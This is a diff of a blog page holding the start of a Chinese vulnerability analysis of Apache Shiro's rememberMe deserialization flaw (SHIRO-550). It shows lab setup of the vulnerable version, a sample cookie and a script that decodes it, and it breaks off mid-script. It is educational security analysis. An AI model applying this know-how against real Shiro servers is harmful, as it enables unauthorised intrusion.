@@ -1,277 +1,158 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>Java反序列化漏洞分析(一)-Shiro550 | yhy's blog</title><meta name="keywords" content="漏洞原理"><meta name="author" content="yhy"><meta name="copyright" content="yhy"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="本菜鸡算是第一次正式分析这种玩意，很烂，都是跟着网上的分析教程走一遍，算是打响java反序列化漏洞的第一枪。我还欠了两篇文章，记着呢。  0x01 前言Apache Shiro是一个开源安全框架，提供身份验证、授权、密码学和会话管理。在它编号为550的issue 中爆出严重的Java反序列化漏洞。 在Apache Shiro&lt;&#x3D;1.2.4版本中AES加密时采用的key是硬编码在代码中的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java反序列化漏洞分析(一)-Shiro550">
+<meta property="og:url" content="https://fireline.fun/2021/05/21/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90(%E4%B8%80)-Shiro550/index.html">
+<meta property="og:site_name" content="yhy&#39;s blog">
+<meta property="og:description" content="本菜鸡算是第一次正式分析这种玩意，很烂，都是跟着网上的分析教程走一遍，算是打响java反序列化漏洞的第一枪。我还欠了两篇文章，记着呢。  0x01 前言Apache Shiro是一个开源安全框架，提供身份验证、授权、密码学和会话管理。在它编号为550的issue 中爆出严重的Java反序列化漏洞。 在Apache Shiro&lt;&#x3D;1.2.4版本中AES加密时采用的key是硬编码在代码中的">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://fireline.fun/img/default.png">
+<meta property="article:published_time" content="2021-05-21T02:30:00.000Z">
+<meta property="article:modified_time" content="2021-05-21T09:30:36.409Z">
+<meta property="article:author" content="yhy">
+<meta property="article:tag" content="漏洞原理">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://fireline.fun/img/default.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://fireline.fun/2021/05/21/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90(%E4%B8%80)-Shiro550/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Java反序列化漏洞分析(一)-Shiro550',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-05-21 17:30:36'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
 
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
 
-<!DOCTYPE html>
-<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
 
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
 
-
-<head>
-  <meta charset="UTF-8">
-  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
-  <link rel="icon" href="/img/favicon.png">
-  <meta name="viewport"
-        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
-  <meta http-equiv="x-ua-compatible" content="ie=edge">
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
   
-  <meta name="theme-color" content="#2f4154">
-  <meta name="description" content="yhy的个人博客">
-  <meta name="author" content="yhy">
-  <meta name="keywords" content="">
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
   
-  <title>Java反序列化漏洞分析(一)-Shiro550 - yhy&#39;s blog</title>
-
-  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
-
-
-  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
-  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
-
-  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
     
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
     
-      
-      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    const fontSizeVal = saveToLocal.get('global-font-size')
+    if (fontSizeVal !== undefined) {
+      document.documentElement.style.setProperty('--global-font-size', fontSizeVal + 'px')
+    }
     
-  
-
-  
-    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
-  
-
-
-
-<!-- 主题依赖的图标库，不要自行修改 -->
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
-
-
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
-
-
-<link  rel="stylesheet" href="/css/main.css" />
-
-<!-- 自定义样式保持在最底部 -->
-
-
-  <script id="fluid-configs">
-    var Fluid = window.Fluid || {};
-    var CONFIG = {"hostname":"fireline.fun","root":"/","version":"1.8.9","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":true,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":"https://hm.baidu.com/hm.js?613daf119ed9302ff8cc0e60daf78bfe","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
-  </script>
-  <script  src="/js/utils.js" ></script>
-  <script  src="/js/color-schema.js" ></script>
-<meta name="generator" content="Hexo 5.4.0"></head>
-
-
-<body>
-  <header style="height: 70vh;">
-    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
-  <div class="container">
-    <a class="navbar-brand"
-       href="/">&nbsp;<strong>YHY</strong>&nbsp;</a>
-
-    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
-            data-target="#navbarSupportedContent"
-            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
-      <div class="animated-icon"><span></span><span></span><span></span></div>
-    </button>
-
-    <!-- Collapsible content -->
-    <div class="collapse navbar-collapse" id="navbarSupportedContent">
-      <ul class="navbar-nav ml-auto text-center">
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/">
-                <i class="iconfont icon-home-fill"></i>
-                首页
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/archives/">
-                <i class="iconfont icon-archive-fill"></i>
-                归档
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/categories/">
-                <i class="iconfont icon-category-fill"></i>
-                分类
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/tags/">
-                <i class="iconfont icon-tags-fill"></i>
-                标签
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/about/">
-                <i class="iconfont icon-user-fill"></i>
-                关于
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/links/">
-                <i class="iconfont icon-link-fill"></i>
-                友链
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/tools/">
-                <i class="iconfont icon-exp-fill"></i>
-                辅助工具
-              </a>
-            </li>
-          
-        
-        
-          <li class="nav-item" id="search-btn">
-            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
-                class="iconfont icon-search"></i>&nbsp;</a>
-          </li>
-        
-        
-          <li class="nav-item" id="color-toggle-btn">
-            <a class="nav-link" href="javascript:">&nbsp;<i
-                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
-          </li>
-        
-      </ul>
-    </div>
-  </div>
-</nav>
-
-    <div class="banner" id="banner" parallax=true
-         style="background: url('/img/default.png') no-repeat center center;
-           background-size: cover;">
-      <div class="full-bg-img">
-        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
-          <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="Java反序列化漏洞分析(一)-Shiro550">
-              
-            </span>
-
-            
-              <div class="mt-3">
-  
-    <span class="post-meta mr-2">
-      <i class="iconfont icon-author" aria-hidden="true"></i>
-      yhy
-    </span>
-  
-  
-    <span class="post-meta">
-      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2021-05-21 10:30" pubdate>
-        2021年5月21日 上午
-      </time>
-    </span>
-  
-</div>
-
-<div class="mt-1">
-  
-    
-    <span class="post-meta mr-2">
-      <i class="iconfont icon-chart"></i>
-      1.7k 字
-    </span>
-  
-
-  
-    
-    <span class="post-meta mr-2">
-      <i class="iconfont icon-clock-fill"></i>
-      
-      
-      23
-       分钟
-    </span>
-  
-
-  
-  
-    
-      <!-- 不蒜子统计文章PV -->
-      <span id="busuanzi_container_page_pv" style="display: none">
-        <i class="iconfont icon-eye" aria-hidden="true"></i>
-        <span id="busuanzi_value_page_pv"></span> 次
-      </span>
-    
-  
-</div>
-
-            
-          </div>
-
-          
-        </div>
-      </div>
-    </div>
-  </header>
-
-  <main>
-    
-      
-
-<div class="container-fluid nopadding-x">
-  <div class="row nomargin-x">
-    <div class="d-none d-lg-block col-lg-2"></div>
-    <div class="col-lg-8 nopadding-x-md">
-      <div class="container nopadding-x-md" id="board-ctn">
-        <div class="py-5" id="board">
-          <article class="post-content mx-auto">
-            <!-- SEO header -->
-            <h1 style="display: none">Java反序列化漏洞分析(一)-Shiro550</h1>
-            
-              <p class="note note-info">
-                
-                  本文首发于微信公众号：<a target="_blank" href="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210320180703.jpg" rel="nofollow noopener noopener">谁不想当剑仙</a></br></br>本文最后更新于：2021年5月21日 下午
-                
-              </p>
-            
-            <div class="markdown-body">
-              <blockquote>
+    const detectApple = () => {
+      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/custom@1.0.0.css"><link rel="stylesheet" href="/css/color@1.0.0.css"><meta name="generator" content="Hexo 5.4.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/favicon.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">23</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 工具</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/tasklist/"><i class="fa-fw fab fa-battle-net"></i><span> 杀软辅助</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/default.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">yhy's blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 工具</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/tasklist/"><i class="fa-fw fab fa-battle-net"></i><span> 杀软辅助</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Java反序列化漏洞分析(一)-Shiro550</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-05-21T02:30:00.000Z" title="发表于 2021-05-21 10:30:00">2021-05-21</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-05-21T09:30:36.409Z" title="更新于 2021-05-21 17:30:36">2021-05-21</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/">漏洞原理</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>7分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Java反序列化漏洞分析(一)-Shiro550"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
 <p>  本菜鸡算是第一次正式分析这种玩意，很烂，都是跟着网上的分析教程走一遍，算是打响java反序列化漏洞的第一枪。我还欠了两篇文章，记着呢。</p>
 </blockquote>
 <h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>Apache Shiro是一个开源安全框架，提供身份验证、授权、密码学和会话管理。在它编号为550的issue 中爆出严重的Java反序列化漏洞。</p>
@@ -288,11 +169,11 @@
 <p>  只要rememberMe的AES加密密钥泄露，无论shiro是什么版本都会导致反序列化漏洞。</p>
 </blockquote>
 <h2 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h2><p>首先下载源码，并切换有漏洞的版本</p>
-<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/apache/shiro.git  <br><span class="hljs-built_in">cd</span> shiro<br>git checkout shiro-root-1.2.4<br></code></pre></div></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/apache/shiro.git  </span><br><span class="line"><span class="built_in">cd</span> shiro</span><br><span class="line">git checkout shiro-root-1.2.4</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210506223552.png" srcset="/img/loading.gif" lazyload alt="image-20210506223546214"></p>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210506223552.png" alt="image-20210506223546214"></p>
 <p>修改<code>samples/web/pom.xml</code>，支持jsp</p>
-<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210520205022.png" srcset="/img/loading.gif" lazyload alt="image-20210519210957110"></p>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210520205022.png" alt="image-20210519210957110"></p>
 <ol>
 <li><p> Run</p>
 </li>
@@ -305,17 +186,17 @@
 <li><p> Deployment中添加Artifact</p>
 </li>
 <li><p>选择sample-web:war exploded</p>
-<p> <img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210520205028.png" srcset="/img/loading.gif" lazyload alt="image-20210519212838979"></p>
+<p> <img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210520205028.png" alt="image-20210519212838979"></p>
 <blockquote>
 <p>  这里若要使用burpsuite，注意端口不要和bp冲突</p>
 </blockquote>
 </li>
 </ol>
-<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210520205034.png" srcset="/img/loading.gif" lazyload alt="image-20210519210846672"></p>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210520205034.png" alt="image-20210519210846672"></p>
 <p>然后运行即可</p>
-<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210520205039.png" srcset="/img/loading.gif" lazyload alt="image-20210519212950043"></p>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210520205039.png" alt="image-20210519212950043"></p>
 <h2 id="0x03-代码分析"><a href="#0x03-代码分析" class="headerlink" title="0x03 代码分析"></a>0x03 代码分析</h2><p>根据 <a target="_blank" rel="noopener" href="https://issues.apache.org/jira/browse/SHIRO-550">https://issues.apache.org/jira/browse/SHIRO-550</a> 描述</p>
-<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210520205046.png" srcset="/img/loading.gif" lazyload alt="image-20210519211422639"></p>
+<p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210520205046.png" alt="image-20210519211422639"></p>
 <p>这是几个重要的点:</p>
 <ul>
 <li>  检索<code>RememberMe</code> cookie的值</li>
@@ -323,378 +204,117 @@
 <li>  使用AES解密</li>
 <li>  使用Java序列化（<code>ObjectInputStream</code>）反序列化。</li>
 </ul>
-<h3 id="3-1-rememberMe-cookie"><a href="#3-1-rememberMe-cookie" class="headerlink" title="3.1 rememberMe cookie"></a>3.1 rememberMe cookie</h3><p>先来瞧瞧这个cookie，进入登录界面，在登录时，勾选<code>Remember Me</code><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210520205052.png" srcset="/img/loading.gif" lazyload alt="image-20210519213228149"></p>
-<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">rememberMe=+3nYB8HVKgNT9ewnrYDz2kMZA2QhOJucwaUx76IB0ya4ZesDlsfmreeeZ1ngxazK7jEsPKIWkxfdBfVEhPI+fiKqfyV0+tH4U+RcWPwITXq4NgY415Edvbb7Wmx6j+KW6C7RaEMf6A9ib8KvOwZizhXUw8d87EyaXpPd6RzJghoOJJoq7hP4gxLv1L5i9u1EZriLjUcnfaufS5R3jevlVgpYAMhuDWK8m9/lJZvK/IWm4/5RAmiDQEirwB8r57x/tZ71fs7baFXOZVueN/V7dJv8ySJP+ozQ/cy3bcx6+ZgF/MJvn4e5nLtM01u8jgg1rTk7fW+0jt61Znq1mq0BNnzAraTZg+0pSU36+aCiolYLh82BX/jJHweu9COVUyONKrXBcm8mPOz0vO8Kjq581OmACdiQgC1kI6qHrr+GloO0xlk4MJZiVzzYm5YdGkgDOPNGO2Lfh4U5hmprEzlf+5/7zwKILsMtOVrqZG5AXXW1XKTch62gq7jAWAXBmyIU<br></code></pre></div></td></tr></table></figure>
+<h3 id="3-1-rememberMe-cookie"><a href="#3-1-rememberMe-cookie" class="headerlink" title="3.1 rememberMe cookie"></a>3.1 rememberMe cookie</h3><p>先来瞧瞧这个cookie，进入登录界面，在登录时，勾选<code>Remember Me</code><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210520205052.png" alt="image-20210519213228149"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rememberMe=+3nYB8HVKgNT9ewnrYDz2kMZA2QhOJucwaUx76IB0ya4ZesDlsfmreeeZ1ngxazK7jEsPKIWkxfdBfVEhPI+fiKqfyV0+tH4U+RcWPwITXq4NgY415Edvbb7Wmx6j+KW6C7RaEMf6A9ib8KvOwZizhXUw8d87EyaXpPd6RzJghoOJJoq7hP4gxLv1L5i9u1EZriLjUcnfaufS5R3jevlVgpYAMhuDWK8m9/lJZvK/IWm4/5RAmiDQEirwB8r57x/tZ71fs7baFXOZVueN/V7dJv8ySJP+ozQ/cy3bcx6+ZgF/MJvn4e5nLtM01u8jgg1rTk7fW+0jt61Znq1mq0BNnzAraTZg+0pSU36+aCiolYLh82BX/jJHweu9COVUyONKrXBcm8mPOz0vO8Kjq581OmACdiQgC1kI6qHrr+GloO0xlk4MJZiVzzYm5YdGkgDOPNGO2Lfh4U5hmprEzlf+5/7zwKILsMtOVrqZG5AXXW1XKTch62gq7jAWAXBmyIU</span><br></pre></td></tr></table></figure>
 
 <p>使用<code>Base64</code>解码存储为二进制文件</p>
-<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs PYTHON"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-comment"># -*- coding:utf-8 -*-</span><br><span class="hljs-comment"># @Author : yhy</span><br><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-keyword">import</span> struct<br><br>rememberMe = <span class="hljs-string">&#x27;+3nYB8HVKgNT9ewnrYDz2kMZA2QhOJucwaUx76IB0ya4ZesDlsfmreeeZ1ngxazK7jEsPKIWkxfdBfVEhPI+fiKqfyV0+tH4U+RcWPwITXq4NgY415Edvbb7Wmx6j+KW6C7RaEMf6A9ib8KvOwZizhXUw8d87EyaXpPd6RzJghoOJJoq7hP4gxLv1L5i9u1EZriLjUcnfaufS5R3jevlVgpYAMhuDWK8m9/lJZvK/IWm4/5RAmiDQEirwB8r57x/tZ71fs7baFXOZVueN/V7dJv8ySJP+ozQ/cy3bcx6+ZgF/MJvn4e5nLtM01u8jgg1rTk7fW+0jt61Znq1mq0BNnzAraTZg+0pSU36+aCiolYLh82BX/jJHweu9COVUyONKrXBcm8mPOz0vO8Kjq581OmACdiQgC1kI6qHrr+GloO0xlk4MJZiVzzYm5YdGkgDOPNGO2Lfh4U5hmprEzlf+5/7zwKILsMtOVrqZG5AXXW1XKTch62gq7jAWAXBmyIU&#x27;</span><br><br>rememberMe_64 = base64.b64decode(rememberMe)<br><br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;rememberMe&quot;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>)<br><br><br>f.write(rememberMe_64)<br></code></pre></div></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author : yhy</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">rememberMe = <span class="string">&#x27;+3nYB8HVKgNT9ewnrYDz2kMZA2QhOJucwaUx76IB0ya4ZesDlsfmreeeZ1ngxazK7jEsPKIWkxfdBfVEhPI+fiKqfyV0+tH4U+RcWPwITXq4NgY415Edvbb7Wmx6j+KW6C7RaEMf6A9ib8KvOwZizhXUw8d87EyaXpPd6RzJghoOJJoq7hP4gxLv1L5i9u1EZriLjUcnfaufS5R3jevlVgpYAMhuDWK8m9/lJZvK/IWm4/5RAmiDQEirwB8r57x/tZ71fs7baFXOZVueN/V7dJv8ySJP+ozQ/cy3bcx6+ZgF/MJvn4e5nLtM01u8jgg1rTk7fW+0jt61Znq1mq0BNnzAraTZg+0pSU36+aCiolYLh82BX/jJHweu9COVUyONKrXBcm8mPOz0vO8Kjq581OmACdiQgC1kI6qHrr+GloO0xlk4MJZiVzzYm5YdGkgDOPNGO2Lfh4U5hmprEzlf+5/7zwKILsMtOVrqZG5AXXW1XKTch62gq7jAWAXBmyIU&#x27;</span></span><br><span class="line"></span><br><span class="line">rememberMe_64 = base64.b64decode(rememberMe)</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;rememberMe&quot;</span>, <span 